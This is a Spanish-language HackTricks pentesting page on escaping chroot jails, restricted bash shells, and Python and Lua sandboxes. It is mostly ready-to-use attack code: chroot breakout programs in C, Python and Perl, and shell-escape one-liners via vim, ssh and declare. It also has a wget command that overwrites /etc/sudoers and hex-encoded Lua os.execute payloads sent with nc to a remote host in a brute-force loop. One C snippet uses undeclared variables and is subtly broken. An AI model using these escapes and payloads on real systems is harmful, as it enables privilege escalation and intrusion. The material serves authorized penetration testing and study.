# Escapando de Jaulas

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}

## **GTFOBins**

**Busca en** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **si puedes ejecutar algún binario con la propiedad "Shell"**

## Escapes de Chroot

Desde [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations): El mecanismo chroot **no está destinado a defender** contra manipulaciones intencionales por **usuarios privilegiados** (**root**). En la mayoría de los sistemas, los contextos chroot no se apilan correctamente y los programas chrooted **con suficientes privilegios pueden realizar un segundo chroot para escapar**.\
Por lo general, esto significa que para escapar necesitas ser root dentro del chroot.

{% hint style="success" %}
La **herramienta** [**chw00t**](https://github.com/earthquake/chw00t) fue creada para abusar de los siguientes escenarios y escapar de `chroot`.
{% endhint %}

### Root + CWD

{% hint style="warning" %}
Si eres **root** dentro de un chroot **puedes escapar** creando **otro chroot**. Esto se debe a que 2 chroots no pueden coexistir (en Linux), por lo que si creas una carpeta y luego **creas un nuevo chroot** en esa nueva carpeta estando **fuera de él**, ahora estarás **fuera del nuevo chroot** y por lo tanto estarás en el FS.

Esto ocurre porque por lo general chroot NO mueve tu directorio de trabajo al indicado, por lo que puedes crear un chroot pero estar fuera de él.
{% endhint %}

Por lo general no encontrarás el binario `chroot` dentro de una cárcel chroot, pero **podrías compilar, subir y ejecutar** un binario:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Descriptor de archivo guardado

{% hint style="warning" %}
Esto es similar al caso anterior, pero en este caso el **atacante almacena un descriptor de archivo en el directorio actual** y luego **crea el chroot en una nueva carpeta**. Finalmente, como tiene **acceso** a ese **FD** **fuera** del chroot, accede a él y se **escapa**.
{% endhint %}

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

{% hint style="warning" %}
Los descriptores de archivo se pueden pasar a través de Unix Domain Sockets, por lo tanto:

* Crear un proceso hijo (fork)
* Crear UDS para que el padre y el hijo puedan comunicarse
* Ejecutar chroot en el proceso hijo en un directorio diferente
* En el proceso padre, crear un descriptor de archivo de un directorio que esté fuera del nuevo chroot del proceso hijo
* Pasar ese descriptor de archivo al proceso hijo usando el UDS
* El proceso hijo cambia su directorio actual a ese descriptor de archivo, y debido a que está fuera de su chroot, escapará de la cárcel
{% endhint %}

### Root + Mount

{% hint style="warning" %}
* Montar el dispositivo raíz (/) en un directorio dentro del chroot
* Hacer chroot en ese directorio

Esto es posible en Linux
{% endhint %}

### Root + /proc

{% hint style="warning" %}
* Montar procfs en un directorio dentro del chroot (si aún no está montado)
* Buscar un PID que tenga una entrada de raíz/cwd diferente, como: /proc/1/root
* Hacer chroot en esa entrada
{% endhint %}

### Root(?) + Fork

{% hint style="warning" %}
* Crear un Fork (proceso hijo) y hacer chroot en un directorio diferente más profundo en el sistema de archivos y cambiar al mismo
* Desde el proceso padre, mover la carpeta donde se encuentra el proceso hijo a una carpeta anterior al chroot de los hijos
* Este proceso hijo se encontrará fuera del chroot
{% endhint %}

### ptrace

{% hint style="warning" %}
* Hace tiempo, los usuarios podían depurar sus propios procesos desde un proceso de sí mismos... pero esto ya no es posible de forma predeterminada
* De todos modos, si es posible, podrías hacer ptrace en un proceso y ejecutar un shellcode dentro de él ([ver este ejemplo](linux-capabilities.md#cap\_sys\_ptrace)).
{% endhint %}

## Jaulas de Bash

### Enumeración

Obtener información sobre la cárcel:
```bash
echo $SHELL
echo $PATH
env
export
pwd
```
### Modificar PATH

Verifique si puede modificar la variable de entorno PATH.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Usando vim
```bash
:set shell=/bin/sh
:shell
```
### Crear script

Verifique si puede crear un archivo ejecutable con _/bin/bash_ como contenido
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtener bash desde SSH

Si estás accediendo a través de ssh, puedes usar este truco para ejecutar un shell de bash:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
### Declarar
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Puedes sobrescribir, por ejemplo, el archivo sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Otros trucos

[**https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)\
[https://pen-testing.sans.org/blog/2012/0**b**6/06/escaping-restricted-linux-shells](https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells)\
[https://gtfobins.github.io](https://gtfobins.github.io)\
**También podría ser interesante la página:**

{% content-ref url="../bypass-bash-restrictions/" %}
[bypass-bash-restrictions](../bypass-bash-restrictions/)
{% endcontent-ref %}

## Jaulas de Python

Trucos sobre cómo escapar de las jaulas de Python en la siguiente página:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

## Jaulas de Lua

En esta página puedes encontrar las funciones globales a las que tienes acceso dentro de Lua: [https://www.gammon.com.au/scripts/doc.php?general=lua\_base](https://www.gammon.com.au/scripts/doc.php?general=lua\_base)

**Eval con ejecución de comandos:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Algunos trucos para **llamar funciones de una biblioteca sin usar puntos**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Enumerar funciones de una biblioteca:
```bash
for k,v in pairs(string) do print(k,v) end
```
Ten en cuenta que cada vez que ejecutas el comando anterior en un **entorno lua diferente, el orden de las funciones cambia**. Por lo tanto, si necesitas ejecutar una función específica, puedes realizar un ataque de fuerza bruta cargando diferentes entornos lua y llamando a la primera función de la biblioteca le:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtener un shell interactivo de lua**: Si te encuentras dentro de un shell de lua limitado, puedes obtener un nuevo shell de lua (y con suerte ilimitado) ejecutando:
```bash
debug.debug()
```
## Referencias

* [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Diapositivas: [https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf))

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
